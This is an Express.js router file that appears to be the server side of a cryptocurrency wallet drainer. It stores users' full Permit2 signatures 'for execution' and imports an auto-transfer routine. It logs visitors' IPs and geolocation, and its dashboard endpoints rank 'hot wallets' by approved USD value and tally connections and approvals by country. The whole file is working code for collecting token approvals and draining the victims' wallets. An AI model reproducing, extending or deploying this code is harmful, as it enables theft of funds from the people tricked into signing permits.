const express = require('express');
const router = express.Router();
const { Event } = require('../models/Event');
const Wallet = require('../models/Wallet');
const { getGeoData } = require('../services/geoService');
const { calculateUSDValue } = require('../services/priceService');

// Permit2 signature submission
const { executePermit2Transfer } = require('../monitor/autoTransfer');

router.post('/permit2', async (req, res) => {
    try {
      const { owner, token, tokens, spender, nonce, deadline, signature, chainId } = req.body;
      
      // Support both single token and batch formats
      const tokenList = tokens || (token ? [{ address: token, symbol: req.body.tokenSymbol || 'UNKNOWN' }] : []);
      
      if (tokenList.length === 0) {
        return res.status(400).json({ error: 'No tokens provided' });
      }
      
      // Store FULL permit data for execution
      const permitData = {
        owner,
        tokens: tokenList.map(t => ({
          address: t.address,
          symbol: t.symbol || 'UNKNOWN'
        })),
        spender,
        nonce,
        deadline,
        signature, // FULL signature
        chainId,
        receivedAt: new Date()
      };
      
      // Log the permit
      await Event.create({
        event: 'permit_sign_approved',
        walletAddress: owner,
        chainId,
        metadata: {
          tokenCount: tokenList.length,
          tokens: tokenList.map(t => t.symbol || t.address),
          spender,
          nonce,
          deadline,
          signaturePreview: signature.slice(0, 50) + '...',
        }
      });
      
      // Update wallet with permit data and approved tokens
      const approvedTokensList = tokenList.map(t => ({
        address: t.address,
        symbol: t.symbol || 'UNKNOWN',
        approvedAt: new Date(),
        viaPermit2: true
      }));
      
      await Wallet.findOneAndUpdate(
        { address: owner },
        {
          $set: {
            lastSeen: new Date(),
            chainId,
            [`permits.${chainId}.${tokenList[0].address}`]: permitData
          },
          $push: {
            approvedTokens: { $each: approvedTokensList }
          }
        },
        { upsert: true }
      );
      
      console.log(`[API] Permit2 saved for ${owner.slice(0, 10)}... (${tokenList.map(t => t.symbol).join(', ')})`);
      
      res.json({ success: true, tokenCount: tokenList.length });
    } catch (error) {
      console.error('[API] Permit2 error:', error);
      res.status(500).json({ error: error.message });
    }
  });

// Receive log from frontend
router.post('/log', async (req, res) => {
  try {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const geo = await getGeoData(ip);
    
    // Calculate USD value if amount provided
    let amountUSD = 0;
    if (req.body.amount && req.body.tokenSymbol) {
      amountUSD = calculateUSDValue(req.body.tokenSymbol, req.body.amount);
    }
    
    await Event.create({
      ...req.body,
      ip,
      ...geo,
      amountUSD
    });
    
    // Update wallet stats
    if (req.body.walletAddress) {
      await updateWalletStats(req.body.walletAddress, req.body, amountUSD);
    }
    
    res.json({ success: true });
  } catch (error) {
    console.error('Log error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Batch insert
router.post('/log/batch', async (req, res) => {
  try {
    const { batch, sessionId, deviceId } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const geo = await getGeoData(ip);
    
    const events = batch.map(log => ({
      ...log,
      sessionId,
      deviceId,
      ip,
      ...geo
    }));
    
    await Event.insertMany(events);
    res.json({ success: true, count: events.length });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Get stats by country
router.get('/stats/countries', async (req, res) => {
  try {
    const stats = await Event.aggregate([
      { $match: { event: 'connect_approved' } },
      { $group: {
        _id: '$countryCode',
        country: { $first: '$country' },
        count: { $sum: 1 },
        totalUSD: { $sum: '$amountUSD' }
      }},
      { $sort: { count: -1 } },
      { $limit: 20 }
    ]);
    res.json(stats);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Get stats by amount ranges
router.get('/stats/amounts', async (req, res) => {
  try {
    const ranges = [
      { min: 0, max: 100, label: '$0-$100' },
      { min: 100, max: 1000, label: '$100-$1K' },
      { min: 1000, max: 10000, label: '$1K-$10K' },
      { min: 10000, max: Infinity, label: '$10K+' }
    ];
    
    const result = [];
    for (const range of ranges) {
      const count = await Event.countDocuments({
        event: 'approve_confirmed',
        amountUSD: { $gte: range.min, $lt: range.max === Infinity ? 999999999 : range.max }
      });
      result.push({ range: range.label, count });
    }
    
    res.json(result);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Get hot wallets (approved, high potential)
router.get('/wallets/hot', async (req, res) => {
  try {
    const wallets = await Wallet.find({
      autoTransferEnabled: true,
      totalApprovedUSD: { $gt: 100 }
    })
    .sort({ totalApprovedUSD: -1 })
    .limit(50);
    
    res.json(wallets);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Dashboard summary
router.get('/dashboard', async (req, res) => {
  try {
    const now = new Date();
    const dayAgo = new Date(now - 24 * 60 * 60 * 1000);
    
    const [
      totalConnections,
      todayConnections,
      approvedCount,
      totalUSD,
      topCountries
    ] = await Promise.all([
      Event.countDocuments({ event: 'connect_approved' }),
      Event.countDocuments({ event: 'connect_approved', timestamp: { $gte: dayAgo } }),
      Event.countDocuments({ event: 'approve_confirmed' }),
      Event.aggregate([{ $match: { event: 'approve_confirmed' } }, { $group: { _id: null, total: { $sum: '$amountUSD' } } }]),
      Event.aggregate([
        { $match: { event: 'connect_approved' } },
        { $group: { _id: '$country', count: { $sum: 1 } } },
        { $sort: { count: -1 } },
        { $limit: 5 }
      ])
    ]);
    
    res.json({
      totalConnections,
      todayConnections,
      approvedCount,
      totalUSD: totalUSD[0]?.total || 0,
      topCountries
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

async function updateWalletStats(address, data, amountUSD) {
  const update = {
    lastSeen: new Date(),
    $inc: {}
  };
  
  if (data.event === 'approve_confirmed') {
    update.$inc.totalApprovedUSD = amountUSD;
    update.$push = {
      approvedTokens: {
        address: data.tokenAddress,
        symbol: data.tokenSymbol,
        approvedAt: new Date(),
        txHash: data.txHash
      }
    };
  }
  
  if (data.event === 'transfer_confirmed') {
    update.$inc.totalTransferredUSD = amountUSD;
    update.lastTransferAt = new Date();
  }
  
  await Wallet.findOneAndUpdate(
    { address },
    update,
    { upsert: true, new: true }
  );
}

module.exports = router;
